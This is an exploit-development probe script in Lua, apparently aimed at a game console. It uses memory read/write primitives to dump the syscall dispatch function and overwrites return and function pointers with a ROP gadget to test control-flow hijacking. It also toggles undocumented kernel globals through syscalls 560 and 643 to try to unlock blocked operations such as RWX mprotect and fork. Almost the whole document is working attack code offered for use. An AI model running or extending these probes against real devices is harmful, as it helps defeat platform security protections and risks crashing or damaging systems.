-- CRASH_CLASS: MODERATE (Section A/C safe, Section B has controlled writes with restore)
-- PROBE 85a: Dispatch function reverse + return_addr hijack + sys 560 global unlock
--
-- THREE UNTESTED ATTACK ANGLES:
-- A) Read the __call dispatch function bytes from eboot .text (RX, safe to read)
--    The __call CClosure +0x20 IS the syscall dispatcher. 56g confirmed its address.
--    Reading its code reveals the exact dispatch mechanism.
-- B) return_addr writability test — fn_addr+0x10 was NEVER tested on console.
--    46b section G never executed (output truncated). 52a crashed before reaching it.
--    If writable AND used by dispatch: post-syscall return hijack primitive.
-- C) sys 560 global setter + blocked syscall retest
--    sys 560 sets a kernel global at RVA 0x3543a5c with NO checks whatsoever.
--    Unknown consumer. Testing if it gates any blocked operation.
--
-- SELECT SECTION: Change TEST_SECTION to "A", "B", or "C"

local TEST_SECTION = "A"

print("=== PROBE 85a: DISPATCH + RETADDR + GLOBAL UNLOCK ===")
print("Section: " .. TEST_SECTION)
print("")

-- Standard helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("PID: " .. pid)

-- Get pipe metadata
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local ret_str = pipe_str:match("fcall_stub%.return_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

print("fn_addr ptr: " .. (fn_str or "nil"))
print("return_addr ptr: " .. (ret_str or "nil"))
print("ropchain: " .. (rop_str or "nil"))
print("")

-- Get eboot base via dynlib_get_info(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)  -- handle 0 = eboot
local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)
local eboot_base = nil
if eboot_lo and eboot_hi then
    eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
    print("eboot .text base: 0x" .. string.format("%X%08X", eboot_hi, eboot_lo))
end

-- Helper to format addresses
local function fmt(val)
    if not val then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function hexbyte(b)
    return string.format("%02X", b)
end

--------------------------------------------------------------------
if TEST_SECTION == "A" then
--------------------------------------------------------------------
print("=== A: DISPATCH FUNCTION REVERSE ENGINEERING ===")
print("")
print("Reading __call CClosure +0x20 = the syscall dispatch function")
print("This is eboot RX .text — safe to read (not XO)")
print("")

-- Find the __call metamethod CClosure
local mt = getmetatable(syscall.pipe)
if not mt then
    print("ERROR: no metatable on syscall.pipe")
else
    local call_fn = mt.__call
    if not call_fn then
        print("ERROR: no __call in metatable")
    else
        print("__call type: " .. type(call_fn))
        print("__call tostring: " .. tostring(call_fn))

        -- The CClosure for __call: we need its memory address
        -- In Lua 5.1, function addresses from tostring are the GCObject pointer
        local call_str = tostring(call_fn)
        local call_addr_str = call_str:match("function: (%d+)")
        if not call_addr_str then
            call_addr_str = call_str:match("function: (0x[0-9a-fA-F]+)")
        end

        if call_addr_str then
            local call_addr = uint64(call_addr_str)
            print("__call GCObject addr: " .. fmt(call_addr))

            -- CClosure layout: +0x20 is the C function pointer
            local cfunc = safe_rq(call_addr + 0x20)
            print("__call +0x20 (C dispatch fn): " .. fmt(cfunc))

            if cfunc and eboot_base then
                local cf_h, cf_l = get_hi_lo(cfunc)
                local eb_h, eb_l = get_hi_lo(eboot_base)

                -- Calculate offset into eboot
                -- Simple subtraction for same-high-word addresses
                if cf_h == eb_h then
                    local offset = cf_l - eb_l
                    print("Dispatch function offset in eboot: +0x" .. string.format("%X", offset))
                    print("")

                    -- Read the first 512 bytes of the dispatch function
                    -- This is in eboot .text which is RX (readable)
                    print("--- DISPATCH FUNCTION BYTES (first 512) ---")
                    local lines = {}
                    for row = 0, 31 do
                        local base_off = row * 16
                        local hex_parts = {}
                        local all_ok = true
                        for col = 0, 15 do
                            local b = safe_rb(cfunc + base_off + col)
                            if b then
                                hex_parts[col + 1] = hexbyte(b)
                            else
                                hex_parts[col + 1] = "??"
                                all_ok = false
                            end
                        end
                        local addr_off = offset + base_off
                        print(string.format("+%04X: %s", addr_off,
                            table.concat(hex_parts, " ")))
                        if not all_ok and row > 0 then
                            print("  (read failed — may have hit page boundary)")
                            break
                        end
                    end
                    print("--- END DISPATCH BYTES ---")
                    print("")

                    -- Also dump surrounding CClosure fields
                    print("--- __call CClosure struct dump ---")
                    for off = 0, 0x40, 8 do
                        local val = safe_rq(call_addr + off)
                        local note = ""
                        if off == 0x20 then note = " ← C function (dispatch)" end
                        if off == 0x00 then note = " ← GCObject header" end
                        if off == 0x08 then note = " ← env/upval?" end
                        if off == 0x10 then note = " ← nupvalues?" end
                        if off == 0x18 then note = " ← ?" end
                        if off == 0x28 then note = " ← upvalue[0]?" end
                        if off == 0x30 then note = " ← upvalue[1]?" end
                        print(string.format("  +0x%02X: %s%s", off, fmt(val), note))
                    end
                else
                    print("High words differ — complex address math needed")
                    print("cfunc: " .. fmt(cfunc))
                    print("eboot: " .. fmt(eboot_base))

                    -- Still try to read the function bytes
                    print("")
                    print("--- DISPATCH FUNCTION BYTES (first 256) ---")
                    for row = 0, 15 do
                        local base_off = row * 16
                        local hex_parts = {}
                        for col = 0, 15 do
                            local b = safe_rb(cfunc + base_off + col)
                            if b then
                                hex_parts[col + 1] = hexbyte(b)
                            else
                                hex_parts[col + 1] = "??"
                            end
                        end
                        print(string.format("+%03X: %s", base_off,
                            table.concat(hex_parts, " ")))
                    end
                    print("--- END DISPATCH BYTES ---")
                end
            else
                print("Could not read dispatch function or eboot base")
            end

            -- Also read nearby CClosure fields for other metamethods
            print("")
            print("--- Other metamethods ---")
            for _, name in ipairs({"__tostring", "__index", "new", "create_initial_chain"}) do
                local fn = mt[name]
                if fn then
                    local s = tostring(fn)
                    local a = s:match("function: (%d+)") or s:match("function: (0x[0-9a-fA-F]+)")
                    if a then
                        local addr = uint64(a)
                        local cf20 = safe_rq(addr + 0x20)
                        print(string.format("  %s addr=%s +0x20=%s", name, fmt(addr), fmt(cf20)))
                    else
                        print(string.format("  %s: %s (no addr)", name, s))
                    end
                end
            end
        else
            print("Could not parse __call address from: " .. call_str)
            -- Try numeric approach
            print("Trying numeric extraction...")
            local num = tonumber(call_str:match("(%d+)$"))
            if num then
                local call_addr = uint64(string.format("0x%X", num))
                print("Parsed numeric: " .. fmt(call_addr))
                local cfunc = safe_rq(call_addr + 0x20)
                print("__call +0x20: " .. fmt(cfunc))

                if cfunc then
                    print("")
                    print("--- DISPATCH FUNCTION BYTES (first 256) ---")
                    for row = 0, 15 do
                        local base_off = row * 16
                        local hex_parts = {}
                        for col = 0, 15 do
                            local b = safe_rb(cfunc + base_off + col)
                            if b then
                                hex_parts[col + 1] = hexbyte(b)
                            else
                                hex_parts[col + 1] = "??"
                            end
                        end
                        print(string.format("+%03X: %s", base_off,
                            table.concat(hex_parts, " ")))
                    end
                    print("--- END DISPATCH BYTES ---")
                end
            end
        end
    end
end

-- Canary check
local pid2 = to_num(syscall.getpid())
print("")
print("PID check: " .. pid .. " -> " .. pid2 .. (pid == pid2 and " OK" or " CHANGED!"))

--------------------------------------------------------------------
elseif TEST_SECTION == "B" then
--------------------------------------------------------------------
print("=== B: RETURN_ADDR WRITABILITY + REDIRECT TEST ===")
print("")
print("fn_addr+0x10 = return_addr was NEVER tested on console.")
print("46b section G truncated. 52a crashed before reaching it.")
print("")

if not fn_str or not ret_str then
    print("ERROR: Could not parse fn_addr/return_addr from pipe metadata")
else
    local fn_ptr = uint64(fn_str)
    local ret_ptr = uint64(ret_str)

    -- Read current values
    local orig_fn = safe_rq(fn_ptr)
    local orig_ret = safe_rq(ret_ptr)
    print("fn_addr ptr: " .. fn_str)
    print("return_addr ptr: " .. ret_str)
    print("fn_addr value: " .. fmt(orig_fn))
    print("return_addr value: " .. fmt(orig_ret))

    -- Check what return_addr points to
    if orig_ret then
        local ret_h, ret_l = get_hi_lo(orig_ret)
        if eboot_base then
            local eb_h, eb_l = get_hi_lo(eboot_base)
            if ret_h == eb_h then
                local off = ret_l - eb_l
                print("return_addr → eboot+" .. string.format("0x%X", off))
                -- Read the bytes at the return address
                print("Bytes at return target:")
                local hex_parts = {}
                for i = 0, 15 do
                    local b = safe_rb(orig_ret + i)
                    if b then hex_parts[#hex_parts+1] = hexbyte(b)
                    else hex_parts[#hex_parts+1] = "??" end
                end
                print("  " .. table.concat(hex_parts, " "))
            end
        end
    end
    print("")

    -- TEST 1: Is return_addr writable?
    print("--- TEST 1: return_addr writability ---")
    local test_val = uint64("0xDEADBEEFCAFEBABE")
    local wrote = safe_wq(ret_ptr, test_val)
    local readback = safe_rq(ret_ptr)
    local rb_h, rb_l = get_hi_lo(readback)
    local writable = (rb_h == 0xDEADBEEF)
    print("Write test value: " .. fmt(test_val))
    print("Readback: " .. fmt(readback))
    print("return_addr WRITABLE: " .. tostring(writable))

    -- Restore immediately
    safe_wq(ret_ptr, orig_ret)
    local restored = safe_rq(ret_ptr)
    print("Restored: " .. fmt(restored))

    -- Canary
    local pid_c1 = to_num(syscall.getpid())
    print("PID after write test: " .. pid_c1 .. (pid == pid_c1 and " OK" or " CHANGED!"))
    print("")

    if writable then
        print("*** return_addr IS WRITABLE ***")
        print("")

        -- TEST 2: Does changing return_addr affect syscall behavior?
        print("--- TEST 2: return_addr behavioral test ---")
        print("Writing ret gadget to return_addr, then calling getpid")

        -- Find a ret gadget in eboot
        -- From the ROP chain dump, we know ret gadget offsets
        -- The chain always starts with a ret gadget
        if rop_str then
            local rop_base = uint64(rop_str)
            local first_gadget = safe_rq(rop_base)
            print("First chain entry (ret gadget): " .. fmt(first_gadget))

            if first_gadget then
                -- Write ret gadget as return_addr
                safe_wq(ret_ptr, first_gadget)
                local check = safe_rq(ret_ptr)
                print("return_addr set to ret gadget: " .. fmt(check))

                -- Call getpid — if return_addr IS used, this might behave differently
                local ok, r = pcall(function() return syscall.getpid() end)
                print("getpid with ret gadget return_addr: ok=" .. tostring(ok) ..
                    " val=" .. (ok and tostring(to_num(r)) or tostring(r)))

                -- Restore
                safe_wq(ret_ptr, orig_ret)
                print("Restored return_addr")

                local pid_c2 = to_num(syscall.getpid())
                print("PID after behavioral test: " .. pid_c2 ..
                    (pid == pid_c2 and " OK" or " CHANGED!"))
            end
        end

        print("")

        -- TEST 3: fn_addr redirect test
        -- Write a known eboot function address to fn_addr, see if syscall changes
        print("--- TEST 3: fn_addr redirect (if still alive) ---")
        local orig_fn_val = safe_rq(fn_ptr)
        print("Original fn_addr value: " .. fmt(orig_fn_val))

        -- Try writing getpid's expected location
        -- We don't know it exactly, but we can try writing 0 to fn_addr
        -- and see if syscall behavior changes (indicating fn_addr IS used)
        local test_fn = uint64("0x0000000000000001")
        safe_wq(fn_ptr, test_fn)
        local fn_check = safe_rq(fn_ptr)
        print("fn_addr set to: " .. fmt(fn_check))

        -- Call getpid via make_syscall (uses fn_addr path)
        local ok3, r3 = pcall(function()
            local sc = make_syscall(20)  -- getpid
            return sc()
        end)
        print("getpid via make_syscall with fn_addr=1: ok=" .. tostring(ok3) ..
            " val=" .. (ok3 and tostring(to_num(r3)) or tostring(r3)))

        -- Restore
        safe_wq(fn_ptr, orig_fn_val)
        print("Restored fn_addr: " .. fmt(safe_rq(fn_ptr)))

        local pid_c3 = to_num(syscall.getpid())
        print("PID after fn_addr test: " .. pid_c3 ..
            (pid == pid_c3 and " OK" or " CHANGED!"))
    else
        print("return_addr NOT writable — no further tests")
    end
end

--------------------------------------------------------------------
elseif TEST_SECTION == "C" then
--------------------------------------------------------------------
print("=== C: SYS 560 GLOBAL SETTER + BLOCKED SYSCALL RETEST ===")
print("")
print("sys 560 sets kernel global at RVA 0x3543a5c with ZERO checks.")
print("Testing if setting this global unlocks blocked operations.")
print("")

local sc560 = make_syscall(560)

-- First: test basic reachability
print("--- Step 1: sys 560 basic reachability ---")
for _, test_val in ipairs({0, 1, 0x100, 0xFFFF, 0x7FFFFFFF}) do
    local ok, ret = pcall(function()
        return sc560(uint64(test_val))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  sys 560 arg=0x%X: ok=%s ret=%d",
        test_val, tostring(ok), rv))
end
print("")

-- Canary
local pid_c1 = to_num(syscall.getpid())
print("PID after 560 tests: " .. pid_c1 .. (pid == pid_c1 and " OK" or " CHANGED!"))
print("")

-- Step 2: Set the global to various values and test blocked syscalls
print("--- Step 2: Set global + test blocked ops ---")

local function test_blocked_ops(label)
    print("  [" .. label .. "] Testing blocked operations:")

    -- Test mprotect RWX on a GPU mmap page
    local sc_mmap = make_syscall(477)
    local gpu_ok, gpu = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if gpu_ok then
        local gh, gl = get_hi_lo(gpu)
        if gl ~= 0 and gh ~= 0xFFFFFFFF then
            -- Try mprotect RWX
            local sc_mprot = make_syscall(74)
            local mp_ok, mp_ret = pcall(function()
                return sc_mprot(gpu, uint64(0x4000), uint64(7))  -- PROT_READ|WRITE|EXEC
            end)
            local mp_rv = mp_ok and to_num(mp_ret) or -999
            print(string.format("    mprotect(RWX): ok=%s ret=%d", tostring(mp_ok), mp_rv))

            -- Clean up
            local sc_munmap = make_syscall(73)
            pcall(function() sc_munmap(gpu, uint64(0x4000)) end)
        else
            print("    mmap failed, skip mprotect test")
        end
    end

    -- Test fork
    local sc_fork = make_syscall(2)
    local fork_ok, fork_ret = pcall(function() return sc_fork() end)
    local fork_rv = fork_ok and to_num(fork_ret) or -999
    print(string.format("    fork(2): ok=%s ret=%d", tostring(fork_ok), fork_rv))

    -- Test kldstat(308)
    local sc_kld = make_syscall(308)
    local kld_buf = memory.alloc(0x200)
    safe_wd(kld_buf, 0x160)  -- version field
    local kld_ok, kld_ret = pcall(function()
        return sc_kld(uint64(1), kld_buf)
    end)
    local kld_rv = kld_ok and to_num(kld_ret) or -999
    print(string.format("    kldstat(308): ok=%s ret=%d", tostring(kld_ok), kld_rv))

    -- Test rfork
    local sc_rfork = make_syscall(251)
    local rf_ok, rf_ret = pcall(function() return sc_rfork(uint64(0)) end)
    local rf_rv = rf_ok and to_num(rf_ret) or -999
    print(string.format("    rfork(251): ok=%s ret=%d", tostring(rf_ok), rf_rv))

    -- Test ioctl via make_syscall
    local sc_ioctl = make_syscall(54)
    local io_ok, io_ret = pcall(function()
        return sc_ioctl(uint64(0), uint64(0x40044201), uint64(0))
    end)
    local io_rv = io_ok and to_num(io_ret) or -999
    print(string.format("    ioctl(54): ok=%s ret=%d", tostring(io_ok), io_rv))
end

-- Baseline (before setting global)
test_blocked_ops("BASELINE")
print("")

-- Set global to 1 and retest
print("Setting global via sys 560 arg=1...")
pcall(function() sc560(uint64(1)) end)
test_blocked_ops("AFTER-560(1)")
print("")

-- Set global to 0xFFFFFFFF and retest
print("Setting global via sys 560 arg=0xFFFFFFFF...")
pcall(function() sc560(uint64(0xFFFFFFFF)) end)
test_blocked_ops("AFTER-560(0xFFFFFFFF)")
print("")

-- Set global to specific potential unlock values
print("Setting global via sys 560 arg=0x3F (all low bits)...")
pcall(function() sc560(uint64(0x3F)) end)
test_blocked_ops("AFTER-560(0x3F)")
print("")

-- Step 3: Check sys 643 chicken switch interaction
print("--- Step 3: sys 560 + sys 643 combo ---")
local sc643 = make_syscall(643)
print("Setting sys 643 chicken=0xFFFFFFFF then sys 560 arg=0xFFFF...")
pcall(function() sc643(uint64(0xFFFFFFFF)) end)
pcall(function() sc560(uint64(0xFFFF)) end)
test_blocked_ops("AFTER-643+560")
print("")

-- Final canary
local pid_final = to_num(syscall.getpid())
print("Final PID: " .. pid_final .. (pid == pid_final and " OK" or " CHANGED!"))

end -- TEST_SECTION

print("")
print("=== PROBE 85a SECTION " .. TEST_SECTION .. " COMPLETE ===")
